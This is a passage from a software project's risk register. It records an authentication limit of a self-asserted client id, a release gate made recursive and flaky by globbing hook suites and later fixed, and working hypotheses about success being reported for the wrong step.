- **Honest limit on the whole mechanism:** `client_id` is self-asserted. With one shared bearer
  token, any holder can claim any id — including this CLI's fixed `cockpit-cli` constant. It
  separates well-behaved clients and gives a real audit trail; it is not authentication. RC-017
  now records the same limit and the live demonstration of the bypass. (An earlier version of this
  bullet asserted that RC-017 "says so in the same terms" when RC-017 said no such thing — a false
  cross-reference, caught by the audit of this remediation. Exactly the RC-C failure mode of
  claiming a control that is not there, committed while documenting a control that is not there.)
- **Not `controlled` overall:** no test asserts that a reconnecting iOS client retains control.

### RC-023 — wiring the hook suites into the release gate made that gate recursive and flaky
- **State:** `controlled` as of `bf78424`. **Self-inflicted during the issue #52 remediation** and
  recorded because the standing rule has no exception for "we caused it and we fixed it".
- **Mechanism:** `check-release-parity.sh` ran a hardcoded list of three hook suites while seven
  existed, so `test_no_autoprovision.sh` and `test_context_sanitization.sh` — the adversarial
  controls closing RC-013 and RC-016 — ran in no gate at all. Replacing the list with a glob over
  `tests/hooks/test_*.sh` fixed that and introduced a worse problem: `.githooks/pre-push` invokes
  `check-release-parity.sh`, and `test_prepush_*.sh` drives that hook end to end. Parity → prepush
  suite → hook → parity. **Measured at 6 nested invocations in one run**, competing for the same
  detached worktrees.
- **Evidence it was flaky, not merely slow:** two consecutive runs on an identical tree returned
  `exit 1` then `exit 0`. Caught only because the exit code was checked rather than the printed
  `✅ all versions aligned` line, which appeared in both.
- **Why this belongs here rather than being quietly amended:** a gate whose verdict depends on a
  race is worse than the gap it replaced. It certifies failures as passes. RC-006 (local gate
  green, CI red) and RC-012 (main red for 19 days, unnoticed) are the same pathology already on
  this register, and this entry is the third instance — which makes "gates that report a verdict
  they did not earn" a pattern in its own right, not three accidents.
- **Fix:** the parity gate skips `test_prepush_*` by name with the reason written at the skip; the
  pre-push suites run in CI, where nothing re-enters them, and the CI step fails on an empty glob
  rather than passing vacuously.
- **Adversarial control:** reliability measured, not assumed — **5/5 consecutive passes** and
  **0 nested `pre-push:` invocations** after the fix, against 6 before. The empty-glob guard exists
  on both sides so neither surface can pass zero tests silently.
- **Lesson:** a coverage fix that routes a gate through a test of that same gate is a recursion,
  and recursion in a gate reads as flake. Check the invocation graph before globbing, and measure
  N-consecutive reliability rather than trusting one green run.

## Working hypothesis across entries

RC-001, RC-005, and RC-007 share one shape: **an operation returns success for a step that is
not the step the caller cares about.** Enqueue-succeeded reported as delivered. Process-exited-0
reported as registered. Inject-accepted reported as received. If the delivery-architecture
investigation and the RC-005 RCA converge on that, these are not nine issues — they are one
architectural miss (no end-to-end acknowledgement, only local step acks) wearing nine faces,
and the four gaps deferred out of v0.1.7 should be sequenced as one workstream rather than four.

⚠️ Unverified. Two independent investigations are running and neither has reported. This
hypothesis is recorded so it can be **disproved**, not adopted.

**Update 2026-08-02 — the hypothesis gained a fourth member from an independent source.**
RC-019 (watcher advances its cursor past discarded records) has exactly this shape and was found
by an outside auditor who had never read this register. Cursor-advanced reported as consumed.
That is four instances across three subsystems — the ledger, the session registry, and the
watcher — which moves this from "pattern we noticed in one session" toward a real architectural
property: **this codebase acknowledges local steps and has no vocabulary for end-to-end
acknowledgement.** Still not proven, but harder to dismiss than it was.

A second, distinct pattern surfaced in the same audit and deserves its own name:
**claims about controls drift toward reassurance while the controls stay put.** "Proves a plan
is safe to fan out" (RC-014), "authz enforcement loop" (RC-015), and "Rally does not install host
hooks" (contradicted by four committed hook-registration files) were all self-asserted, all
strengthened over time, and none ever graded against the code. Nothing in the pipeline reads a
claim and asks the implementation whether it is true. See
[`rca-2026-08-02-security-findings-escaped.md`](rca-2026-08-02-security-findings-escaped.md) RC-C.
